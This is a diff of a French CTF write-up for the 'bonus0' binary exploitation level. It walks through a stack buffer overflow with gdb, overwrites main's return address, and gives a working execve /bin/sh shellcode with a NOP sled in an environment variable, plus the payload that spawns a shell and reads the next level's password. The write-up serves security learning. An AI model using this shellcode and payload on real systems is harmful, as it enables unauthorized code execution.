@@ -2,7 +2,7 @@
 
 On observe un executable a la racine `bonus0`
 
-```bash
+```shell
 $ ./bonus0
  -
 Hello
@@ -21,7 +21,7 @@ Segmentation fault (core dumped)
 
 On cherche donc a comprendre ce que fait l'executable
 
-```bash
+```shell
 $ gdb bonus0 -q
 Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
 (gdb) set disassembly-flavor intel
@@ -117,7 +117,7 @@ End of assembler dump.
 
 On va utiliser `Cutter` pour avoir un idee plus clair de `bonus0`
 
-```bash
+```shell
 $ scp -P 4242 -r bonus0@192.168.56.102:/home/user/bonus0/bonus0 .
 
 $ ./Cutter-v2.1.2-Linux-x86_64.AppImage bonus0
@@ -127,7 +127,7 @@ _resultat sauvegarde dans [source.md](source.md)_
 
 On peut faire quelque test avec l'executable
 
-```bash
+```shell
 $ (python -c 'print("A" * 19)' ; python -c 'print("B" * 19)') | ./bonus0
  -
  -
@@ -147,7 +147,7 @@ Segmentation fault (core dumped)
 
 On remarque que le retour du main est ecraser
 
-```bash
+```shell
 (gdb) run
 Starting program: /home/user/bonus0/bonus0
  -
@@ -179,13 +179,13 @@ Breakpoint 1, 0x080485ca in main ()
 
 On peut alors modifier le retour du main et le faire pointer vers une variable d'env que lon va creer de suite
 
-```bash
+```shell
 $ export Shellcode=$(python -c 'print "\x90"*100 +"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"')
 ```
 
 On va recuperer l'adresse de cette variable d'env
 
-```bash
+```shell
 (gdb) run
 Starting program: /home/user/bonus0/bonus0
  -
@@ -200,7 +200,7 @@ Le parametre 1 a besoin de faire `20 octets` pour pouvoir avoir le comportement 
 
 On cherche maintenant quel endroit du parametre 2 modifi la valeur de return du main
 
-```bash
+```shell
 (gdb) break *main+39
 Breakpoint 1 at 0x80485cb
 (gdb) run
@@ -216,11 +216,13 @@ Breakpoint 1, 0x080485cb in main ()
 0x6d6c6b6a in ?? ()
 ```
 
-Notre deuxieme parametre aura donc la forme suivant: `"abcdefghi" + "AddressShellCode" + "\x0" * (20-9-4)`
+On se rend compte que l'adresse: `0x6d6c6b6a => jklm`
+
+Notre deuxieme parametre aura donc la forme suivant: `"B"*9 + "AddressShellCode" + "B"*7`
 
 on peut alors essayer
 
-```bash
+```shell
 $ (python -c 'print("A" * 20)' ; python -c 'print("B" * 9 + "\x59\xf8\xff\xbf" + "B" * 7)';cat) | ./bonus0
  -
  -
@@ -228,9 +230,4 @@ AAAAAAAAAAAAAAAAAAAABBBBBBBBBY���BBBBBBB��� BBBBBBBBBY���BBBBB
 cat /home/user/bonus1/.pass
 cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
 Ctrl+D
-
-bonus0:$ su bonus1
-Password:
-
-bonus1:$
 ```
